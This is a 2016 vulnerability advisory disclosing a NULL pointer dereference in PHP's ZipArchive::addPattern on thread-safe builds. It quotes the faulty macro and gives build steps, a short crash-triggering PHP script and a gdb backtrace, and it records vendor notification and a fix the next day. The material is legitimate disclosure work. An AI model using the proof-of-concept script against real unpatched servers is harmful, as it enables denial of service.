---
title: "PHP NULL pointer dereference in zend_virtual_cwd (v. master-Git-2016-07-23)"
date: 2016-07-23 00:00:00
preview: ""
---

* _Author_: Martino Sani
* _Software_: PHP
* _Version_: master-Git-2016-07-23
* _Release date_: 2016-07-23
* _CVE_: -
* _Reference_: https://bugs.php.net/bug.php?id=72660

One of the `IS_ABSOLUTE_PATH` macro in `zend_virtual_cwd.h` file does not verify that the path is not null. This could lead to a null pointer dereference issue.
I triggered the issue through `ZipArchive::addPattern` function and ZTS (Zend Thread Safety) enabled, but maybe it could be triggered via different vectors.

[ZipArchive.AddPatter](http://php.net/manual/en/ziparchive.addpattern.php) reports that the default value of $path argument is `.` but in my tests it was null.

`zend_virtual_cwd.h (line 112)`:

```c
#ifndef IS_ABSOLUTE_PATH
#define IS_ABSOLUTE_PATH(path, len) \
        (IS_SLASH(path[0]))
#endif
```

`php_zip.c (line 609)`:

```c
#ifdef ZTS
if (!IS_ABSOLUTE_PATH(path, path_len)) {
   result = VCWD_GETCWD(cwd, MAXPATHLEN);
```

# PHP build

```
./buildconf --force
./configure --enable-zip --enable-maintainer-zts
make && make install
```

# Test script

```php
<?php
$zip = new ZipArchive();
$zip->open("foo.zip", ZIPARCHIVE::CREATE);
$zip->addPattern("/\./");
$zip->close();
?>
```

# Expected result

PHP interpreter should not crash.

# Actual result

```
Program received signal SIGSEGV, Segmentation fault.

0x0000000001f7e049 in php_zip_pcre (regexp=<optimized out>, path=0x0, path_len=<optimized out>, return_value=<optimized out>) at ext/zip/php_zip.c:610
warning: Source file is more recent than executable.
610             if (!IS_ABSOLUTE_PATH(path, path_len)) {

(gdb) bt

#0  0x0000000001f7e049 in php_zip_pcre (regexp=<optimized out>, path=0x0, path_len=<optimized out>, return_value=<optimized out>) at ext/zip/php_zip.c:610
#1  0x0000000001f9cb8b in php_zip_add_from_pattern (execute_data=<optimized out>, return_value=<optimized out>, type=<optimized out>) at ext/zip/php_zip.c:1669
#2  0x000000000276ddd4 in ZEND_DO_FCALL_SPEC_RETVAL_UNUSED_HANDLER (execute_data=<optimized out>) at Zend/zend_vm_execute.h:970
#3  0x0000000002673052 in execute_ex (ex=<optimized out>) at Zend/zend_vm_execute.h:432
#4  0x0000000002673c2f in zend_execute (op_array=<optimized out>, return_value=<optimized out>) at Zend/zend_vm_execute.h:474
#5  0x000000000242b711 in zend_execute_scripts (type=<optimized out>, retval=<optimized out>, file_count=<optimized out>) at Zend/zend.c:1447
#6  0x000000000202ccce in php_execute_script (primary_file=0x7fffffffcd20) at main/main.c:2533
#7  0x0000000002a97fe3 in do_cli (argc=<optimized out>, argv=<optimized out>) at sapi/cli/php_cli.c:990
#8  0x0000000002a9385c in main (argc=3, argv=0x60300000ee30) at sapi/cli/php_cli.c:1378

(gdb) info args

regexp = <optimized out>
path = 0x0
```

# Notes

* 2016-07-23: Vendor notification.
* 2016-07-24: Vendor fixes the issue.
	
The author is not responsible for the misuse of the information provided in this advisory.